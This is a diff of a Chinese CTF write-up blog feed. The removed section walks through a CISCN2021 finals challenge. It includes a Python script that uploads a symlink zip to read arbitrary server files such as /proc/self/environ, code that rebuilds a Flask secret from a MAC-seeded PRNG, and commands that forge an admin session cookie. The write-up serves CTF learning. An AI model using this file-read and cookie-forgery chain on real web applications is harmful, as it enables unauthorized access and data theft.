-&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
-&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
-&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
-&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
-&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
-&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
-&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
-&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
-&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 /proc/self/environ
-python3 exp.py /app/y0u_found_it.ini
-python3 /app/y0u_found_it/y0u_found_it_main.py
-python3 /sys/class/net/eth0/address
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
-&lt;p>exp.py - 2 根据mac地址生成伪随机数&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
-&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
-&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
-&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
-&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
-&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
-python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
-&lt;p>翻回头看源码，好家伙这里有内鬼&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
-&lt;p>返回的并不是真正的flag，而是secret.secret中的内容no flah&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
-&lt;p>67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1&lt;/p>
-&lt;p>————这里我感觉原题应该secret.py中的&lt;code>secret=&lt;/code>直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（&lt;/p>
-&lt;h2 id="ciscn2021-总决赛easy_python">***[CISCN2021 总决赛]easy_python&lt;/h2>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
-&lt;p>不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机&lt;/p>
-&lt;h2 id="ciscn2021-总决赛ezj4va">***[CISCN2021 总决赛]ezj4va&lt;/h2>
-&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
-&lt;p>还不会java 先空着TAT&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
+&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
 &lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
 &lt;blockquote>
 &lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
